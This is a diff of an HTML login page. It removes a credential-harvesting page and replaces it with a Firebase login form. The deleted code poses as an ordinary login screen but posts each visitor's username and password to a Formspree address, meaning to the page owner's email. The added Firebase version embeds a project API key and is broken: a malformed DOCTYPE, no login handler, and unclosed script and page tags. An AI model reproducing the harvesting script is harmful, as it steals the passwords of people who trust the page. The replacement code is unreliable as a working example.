@@ -1,128 +1,46 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Login Page</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f8f9fa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .container {
-      background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-      width: 100%;
-      max-width: 380px;
-      text-align: center;
-    }
-
-    .logo {
-      font-size: 36px;
-      font-weight: bold;
-      margin-bottom: 20px;
-      color: #1a73e8;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    input {
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      outline: none;
-      font-size: 16px;
-    }
-
-    input:focus {
-      border-color: #1a73e8;
-    }
-
-    button {
-      background-color: #1a73e8;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
-      font-weight: bold;
-      transition: background-color 0.2s;
-    }
-
-    button:hover {
-      background-color: #1669c1;
-    }
-
-    .msg {
-      margin-top: 15px;
-      color: green;
-      font-size: 14px;
-      display: none;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Firebase Login</title>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-  <img src="OIP.jpeg" alt="My App Logo" style="width:120px; height:auto;">
-</div>
+  <h2>Firebase Login</h2>
+  
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Enter Email" required><br><br>
+    <input type="password" id="password" placeholder="Enter Password" required><br><br>
+    <button type="submit">Login</button>
+    <button type="button" id="signup">Sign Up</button>
+  </form>
 
-    <form id="loginForm" autocomplete="off">
-      <input type="text" id="username" name="username" placeholder="Enter Username" required />
-      <input type="password" id="password" name="password" placeholder="Enter Password" required />
-      <button type="submit">Login</button>
-    </form>
-
-    <div class="msg" id="msg">✅ Login details sent!</div>
-  </div>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js"></script>
 
   <script>
-    const FORMSPREE_URL = "https://formspree.io/f/mqadgqvj"; // Replace with your Formspree URL
+    // Your Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyA0oqIi0T6dH0MWRmXWFdXaZCpp0XCPy0",
+      authDomain: "login-2fdb9.firebaseapp.com",
+      projectId: "login-2fdb9",
+      storageBucket: "login-2fdb9.appspot.com",
+      messagingSenderId: "422890098304",
+      appId: "1:422890098304:web:b2b632575d63c5af20a065",
+      measurementId: "G-VMPRSGL4E5"
+    };
 
-    const form = document.getElementById("loginForm");
-    const msg = document.getElementById("msg");
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+    // Sign Up
+    document.getElementById("signup").addEventListener("click", () => {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      if (!username || !password) {
-        alert("Please fill out all fields!");
-        return;
-      }
-
-      // Send login data to your email via Formspree
-      try {
-        await fetch(FORMSPREE_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ username, password })
-        });
-
-        msg.style.display = "block";
-
-        // Clear the form after submit
-        form.reset();
-      } catch (error) {
-        alert("Error sending data!");
-      }
+      auth.createUserWithEmailAndPassword(email, password)
+        .then(() => alert("Signup Successful ✅"))
+        .catch(error => alert(error.message));
     });
-  </script>
-</body>
-</html>
